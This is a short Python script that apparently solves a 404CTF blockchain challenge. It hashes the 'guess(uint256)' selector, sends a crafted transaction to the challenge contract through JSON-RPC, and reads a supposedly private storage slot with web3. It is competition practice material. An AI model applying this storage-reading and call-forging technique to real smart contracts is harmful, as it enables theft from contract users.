#!/bin/python3
import requests
import json

import requests
import json

url = "https://blockchain.challenges.404ctf.fr/"
chain_id = 31337
contract_address = "0xA156AD8Efeb4a5708b3564d46eEED59d9AD9a94a"

def make_json_rpc_request(method, params=None):
    headers = {'Content-Type': 'application/json'}
    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params,
        "id": 1
    }
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    return response.json()

import sha3
sha3_hash = sha3.keccak_256("guess(uint256)".encode()).hexdigest()
method_id = "0x"+sha3_hash[:8]
print(method_id)


response = make_json_rpc_request("eth_sendTransaction", [{
    "to": contract_address,
    "data": "0x9189fec1"+"000000000000000000000000000000000000000000000000000000004be26123",
    "chainId": hex(chain_id)
}])
print(response)

from web3 import Web3, HTTPProvider
w3 = Web3(HTTPProvider(url))
storage = w3.eth.get_storage_at(contract_address, 4)
print(storage.hex())
